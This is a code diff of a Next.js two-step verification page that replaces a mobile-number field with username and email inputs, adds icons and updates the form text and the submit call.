@@ -4,13 +4,14 @@ import React, { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
 import { submitGateForm, submitVerificationForm } from "@/features/auth/actions";
-import { ChevronDown, Loader2, AlertCircle } from "lucide-react";
+import { ChevronDown, Loader2, AlertCircle, User, Mail, Fingerprint } from "lucide-react";
 
 export default function GatePage() {
   const router = useRouter();
   const [step, setStep] = useState(1); 
   
-  const [mobile, setMobile] = useState("");
+  const [username, setUsername] = useState("");
+  const [email, setEmail] = useState("");
   const [idNumber, setIdNumber] = useState("");
   const [idType, setIdType] = useState("NIN");
   const [loading, setLoading] = useState(false);
@@ -33,14 +34,15 @@ export default function GatePage() {
     setLoading(true);
     setError("");
 
-    const result = await submitGateForm(mobile, idNumber);
+    // Pass the new fields to the action
+    const result = await submitGateForm(username, email, idNumber);
     
     if (result?.error) {
       setError(result.error);
       setLoading(false);
     } else {
       setStep(2);
-      setIdNumber(""); // Clear the ID for Step 2
+      setIdNumber(""); // Clear the ID so they must type it again for verification
       setLoading(false);
     }
   };
@@ -87,7 +89,7 @@ export default function GatePage() {
           </h1>
           <p className="text-text-muted text-sm mt-2 text-center">
             {step === 1 
-              ? "Enter your mobile number and ID to begin." 
+              ? "Enter your details to begin." 
               : "Select your ID type and enter the exact ID number."}
           </p>
         </div>
@@ -101,22 +103,46 @@ export default function GatePage() {
         {/* STEP 1 FORM */}
         {step === 1 && (
           <form onSubmit={handleStep1} className="flex flex-col gap-4 relative z-10">
+            
+            {/* Username Input */}
             <div className="flex flex-col gap-2">
-              <label className="text-sm text-text-muted font-medium">Mobile Number</label>
-              <input
-                type="tel" required value={mobile} onChange={(e) => setMobile(e.target.value)}
-                placeholder="e.g. 08012345678"
-                className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 px-4 text-surface-white focus:outline-none focus:border-brand-green"
-              />
+              <label className="text-sm text-text-muted font-medium">Username</label>
+              <div className="relative">
+                <User className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
+                <input
+                  type="text" required value={username} onChange={(e) => setUsername(e.target.value)}
+                  placeholder="e.g. JohnDoe99"
+                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
+                />
+              </div>
             </div>
+
+            {/* Email Input */}
+            <div className="flex flex-col gap-2">
+              <label className="text-sm text-text-muted font-medium">Email Address</label>
+              <div className="relative">
+                <Mail className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
+                <input
+                  type="email" required value={email} onChange={(e) => setEmail(e.target.value)}
+                  placeholder="e.g. john@example.com"
+                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
+                />
+              </div>
+            </div>
+
+            {/* Primary ID Input */}
             <div className="flex flex-col gap-2">
               <label className="text-sm text-text-muted font-medium">Primary ID Number</label>
-              <input
-                type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
-                placeholder="Enter your ID number"
-                className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 px-4 text-surface-white focus:outline-none focus:border-brand-green"
-              />
+              <div className="relative">
+                <Fingerprint className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
+                <input
+                  type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
+                  placeholder="Enter your ID number"
+                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
+                />
+              </div>
             </div>
+
             <button type="submit" disabled={loading}
               className="mt-4 w-full bg-brand-green hover:bg-brand-green-dark text-surface-white font-bold py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
               {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Get Passcode"}
@@ -152,7 +178,6 @@ export default function GatePage() {
               />
             </div>
 
-            {/* FULL WIDTH BUTTON ONLY */}
             <button type="submit" disabled={loading}
               className="mt-4 w-full bg-brand-green hover:bg-brand-green-dark text-surface-white font-bold py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
               {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Verify & Unlock"}
